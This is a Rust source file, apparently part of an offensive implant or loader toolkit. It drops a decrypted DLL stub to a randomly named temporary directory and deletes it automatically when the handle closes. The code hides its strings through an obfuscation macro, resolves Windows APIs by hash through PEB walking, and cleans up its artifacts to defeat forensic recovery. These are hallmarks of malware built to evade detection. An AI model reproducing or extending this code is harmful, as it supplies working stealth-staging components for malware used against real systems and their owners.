//! RAII handle for the dropped loader stub. Closing the handle + deleting
//! the file + removing the dir happens automatically on drop.

use alloc::string::String;
use alloc::vec::Vec;
use core::ffi::c_void;
use opsec_bootstrap::Bootstrap;
use opsec_peb::{resolve_export, resolve_module};
use opsec_strcrypt::{hash, obf};

pub struct StubArtifact<'b> {
    pub bs: &'b Bootstrap,
    pub handle: *mut c_void,
    pub dos_path: String,
    pub dos_dir: String,
}

impl<'b> StubArtifact<'b> {
    /// Drop the encrypted stub bytes to a freshly-created subdir of
    /// `parent_dir_dos`. Filename is `<rand>.dll`. The file is created
    /// with `FILE_DELETE_ON_CLOSE` so the handle holds it alive.
    ///
    /// # Safety
    /// `bs` must be initialized; `parent_dir_dos` must exist and be writable.
    pub unsafe fn create(
        bs: &'b Bootstrap,
        parent_dir_dos: &str,
        decrypted_stub_bytes: &[u8],
    ) -> Option<Self> {
        unsafe {
            let rand = random16_hex();
            let dos_dir = alloc::format!("{}\\{}", parent_dir_dos, rand);

            // Create subdir
            let mut subdir_nt = nt_path_zwide(&dos_dir);
            if !crate::fs::create_directory(bs, &mut subdir_nt) {
                return None;
            }

            // Create file with FILE_DELETE_ON_CLOSE
            let dll_suffix = obf!(".dll");
            let dos_path = alloc::format!(
                "{}\\{}{}",
                dos_dir,
                rand,
                core::str::from_utf8(dll_suffix.as_bytes()).unwrap_or(""),
            );
            let mut file_nt = nt_path_zwide(&dos_path);
            let handle = crate::fs::create_file_delete_on_close(bs, &mut file_nt)?;

            // Write stub bytes
            if !crate::fs::write_all(bs, handle, decrypted_stub_bytes) {
                bs.nt_close(handle);
                return None;
            }

            Some(Self { bs, handle, dos_path, dos_dir })
        }
    }
}

impl Drop for StubArtifact<'_> {
    fn drop(&mut self) {
        unsafe {
            // Closing the handle triggers the pending-delete (FILE_DELETE_ON_CLOSE).
            if !self.handle.is_null() {
                let _ = self.bs.nt_close(self.handle);
            }
            // Belt-and-suspenders: explicit DeleteFileW + RemoveDirectoryW.
            // These succeed even if the file is mmap'd by coreclr.
            if let Some(kbase) = resolve_module(hash!("kernelbase.dll")) {
                if let Some(del) = resolve_export(kbase, hash!("DeleteFileW")) {
                    type Fn = unsafe extern "system" fn(*const u16) -> i32;
                    let f: Fn = core::mem::transmute::<*const (), Fn>(del);
                    let mut p: Vec<u16> = self.dos_path.encode_utf16().collect();
                    p.push(0);
                    let _ = f(p.as_ptr());
                }
                if let Some(rmd) = resolve_export(kbase, hash!("RemoveDirectoryW")) {
                    type Fn = unsafe extern "system" fn(*const u16) -> i32;
                    let f: Fn = core::mem::transmute::<*const (), Fn>(rmd);
                    let mut p: Vec<u16> = self.dos_dir.encode_utf16().collect();
                    p.push(0);
                    let _ = f(p.as_ptr());
                }
            }
        }
    }
}

fn nt_path_zwide(dos: &str) -> Vec<u16> {
    let pfx = obf!("\\??\\");
    let prefix = core::str::from_utf8(pfx.as_bytes()).unwrap_or("");
    let mut v: Vec<u16> = alloc::format!("{}{}", prefix, dos).encode_utf16().collect();
    v.push(0);
    v
}

/// 16-char hex string seeded from RDTSC (variable each call).
fn random16_hex() -> alloc::string::String {
    let lo: u64;
    let hi: u64;
    unsafe {
        core::arch::asm!(
            "rdtsc",
            out("rax") lo,
            out("rdx") hi,
            options(nomem, nostack, preserves_flags),
        );
    }
    let mut x = (hi << 32) | (lo & 0xFFFF_FFFF);
    let hex = b"0123456789abcdef";
    let mut out = [0u8; 16];
    for byte in &mut out {
        *byte = hex[(x & 0xF) as usize];
        x >>= 4;
    }
    alloc::string::String::from_utf8(out.to_vec()).unwrap_or_else(|_| alloc::string::String::from("0123456789abcdef"))
}
